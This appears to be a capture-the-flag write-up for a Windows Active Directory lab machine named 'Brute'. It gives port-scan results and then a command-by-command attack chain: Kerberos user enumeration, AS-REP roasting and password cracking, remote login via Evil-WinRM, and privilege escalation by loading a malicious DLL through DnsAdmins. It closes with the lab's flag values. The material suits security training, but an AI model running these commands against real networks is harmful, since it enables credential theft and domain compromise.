# Brute

**IP Address:** 172.31.3.3

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3268/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 3269/tcp | open | tcpwrapped |   |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 389/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 445/tcp | open | microsoft-ds |   |
| 464/tcp | open | kpasswd5 |   |
| 47001/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 49664/tcp | open | msrpc | Microsoft Windows RPC  |
| 49665/tcp | open | msrpc | Microsoft Windows RPC  |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49668/tcp | open | msrpc | Microsoft Windows RPC  |
| 49669/tcp | open | msrpc | Microsoft Windows RPC  |
| 49672/tcp | open | msrpc | Microsoft Windows RPC  |
| 49675/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 49676/tcp | open | msrpc | Microsoft Windows RPC  |
| 49683/tcp | open | msrpc | Microsoft Windows RPC  |
| 49699/tcp | open | msrpc | Microsoft Windows RPC  |
| 49705/tcp | open | msrpc | Microsoft Windows RPC  |
| 49746/tcp | open | msrpc | Microsoft Windows RPC  |
| 53/tcp | open | domain | Simple DNS Plus  |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 636/tcp | open | tcpwrapped |   |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos  |
| 9389/tcp | open | mc-nmf | .NET Message Framing  |
| 123/udp | open | ntp | NTP v3 |
| 137/udp | open | netbios-ns | Microsoft Windows or Samba netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 500/udp | open|filtered | isakmp |   |
| 53/udp | open | domain |   |

## Exploitation
### Exploit Details (Bruteforce Credentials)
* **Name** - Bruteforce Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. Bruteforce a list of usernames to find valid users on the domain. 

Commands
```
kerbrute userenum --dc $ip -d brute.csl /usr/share/wordlists/names.txt
```

![Execute Exploit](images/exploit1.png)

2. Create a users.txt file with all of the found users. Then run GetNPUsers.py to try and find any hashes and crack them with john. 

Commands
```
GetNPUsers.py brute.csl/ -usersfile users.txt -format john -outputfile hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/exploit2.png)

3. Use the found credenials to login remotely with Evil-WinRM. 

Commands
```
evil-winrm -i $ip -u tess -p Unique1
whoami
type ..\Desktop\access.txt
```

![Execute Exploit](images/exploit3.png)

## Privilege Escalation
### Exploit Details (Permissions (DNS Amins))
* **Name** - Permissions (DNS Admins)
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Commands
```bash
upload /root/share/shell.dll
dnscmd /config /serverlevelplugindll c:\Users\Tess\Documents\shell.dll
sc.exe stop dns
sc.exe start dns
whoami
type C:\Users\Administrator\Desktop\system.txt
```

![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)

## Loot
```
access.txt
fb23c6d8d663aa63870cfb5e535597a8
system.txt
393bca87e3cb9dc049f3e61483f83cc1
```